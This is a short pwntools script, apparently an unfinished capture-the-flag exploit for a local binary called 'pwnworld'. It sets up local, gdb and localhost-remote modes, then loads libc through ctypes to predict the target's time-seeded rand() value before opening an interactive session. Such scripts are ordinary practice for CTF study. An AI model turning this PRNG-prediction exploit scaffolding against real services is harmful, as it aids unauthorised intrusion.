from pwn import *
from sys import *
import ctypes

elf = context.binary = ELF("./pwnworld")
p = process("./pwnworld")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

HOST = 'localhost'
PORT = 10012

cmd = """
b*main
"""
if(argv[1] == 'gdb'):
	gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
	p = remote(HOST,PORT)

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(LIBC.time(0))
addr = LIBC.rand() % 417
print(addr)

p.interactive()